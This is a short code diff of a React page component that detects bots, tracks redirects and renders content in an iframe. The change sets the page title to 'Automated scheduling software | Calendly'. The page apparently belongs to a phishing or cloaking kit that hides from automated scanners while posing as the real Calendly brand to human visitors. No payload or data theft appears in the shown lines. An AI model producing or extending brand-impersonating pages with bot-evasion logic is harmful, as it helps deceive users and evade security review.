@@ -22,7 +22,7 @@ const Index: FC = () => {
     const { isBot, isLoading, shouldRedirect,botReason } = useBotDetection();
     const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
-    let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
+    let[SiteTitleMeta, SetSiteTitleMeta] = useState('Automated scheduling software | Calendly');
     function showIframe(file,title,favicon) {
     const html = (
       <>
